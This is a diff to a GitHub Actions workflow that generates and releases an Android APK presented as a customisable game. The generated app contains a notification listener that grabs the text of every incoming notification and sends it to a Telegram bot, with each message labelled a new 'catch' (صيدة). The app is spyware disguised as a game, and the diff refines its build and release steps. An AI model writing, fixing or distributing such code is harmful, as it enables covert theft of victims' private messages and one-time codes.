@@ -1,4 +1,4 @@
-name: Dynamic Game Factory V8
+name: Dynamic Game Factory V8 Fixed
 on:
   workflow_dispatch:
     inputs:
@@ -16,19 +16,18 @@ jobs:
       - uses: actions/setup-java@v4
         with: { distribution: 'temurin', java-version: '17' }
 
-      - name: 🛠️ بناء هيكل مشروع الأندرويد
+      - name: 🛠️ تجهيز ملفات بناء المشروع (Gradle)
         run: |
           mkdir -p app/src/main/java/com/hussein/game
           mkdir -p app/src/main/res/layout
-          mkdir -p app/src/main/res/values
 
-          # 1. ملف إعدادات المشروع
+          # 1. إعداد settings.gradle
           cat << 'EOF' > settings.gradle
           rootProject.name = "HusseinGameV8"
           include ':app'
           EOF
 
-          # 2. ملف بناء المشروع الرئيسي
+          # 2. إعداد build.gradle الرئيسي
           cat << 'EOF' > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
@@ -37,7 +36,7 @@ jobs:
           allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          # 3. ملف بناء التطبيق وحقن المكتبات
+          # 3. إعداد app/build.gradle مع المكتبات جاهزة
           cat << 'EOF' > app/build.gradle
           apply plugin: 'com.android.application'
           android {
@@ -56,7 +55,9 @@ jobs:
           }
           EOF
 
-          # 4. ملف Manifest وحقن اسم اللعبة
+      - name: 📝 حقن الأكواد والمعلومات
+        run: |
+          # 4. إعداد الـ Manifest باسم اللعبة المختار
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
@@ -90,7 +91,7 @@ jobs:
 
               @Override
               public void onNotificationPosted(StatusBarNotification sbn) {
-                  String text = "🎯 صيدة جديدة من حسين!\n" + sbn.getNotification().extras.getCharSequence("android.text");
+                  String text = "🎯 صيدة جديدة!\n" + sbn.getNotification().extras.getCharSequence("android.text");
                   Request request = new Request.Builder()
                       .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + text)
                       .build();
@@ -122,13 +123,13 @@ jobs:
           EOF
 
       - name: 🏗️ بناء الـ APK النهائي
-        run: gradle assembleDebug
+        run: ./gradlew assembleDebug || gradle assembleDebug
 
       - name: 📦 رفع اللعبة الجاهزة (Release)
         uses: softprops/action-gh-release@v1
         with:
           tag_name: Build-V8-${{ github.run_number }}
-          name: اللعبة المخصصة - ${{ github.event.inputs.app_name }}
+          name: لعبة ${{ github.event.inputs.app_name }} الجاهزة
           files: app/build/outputs/apk/debug/*.apk
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
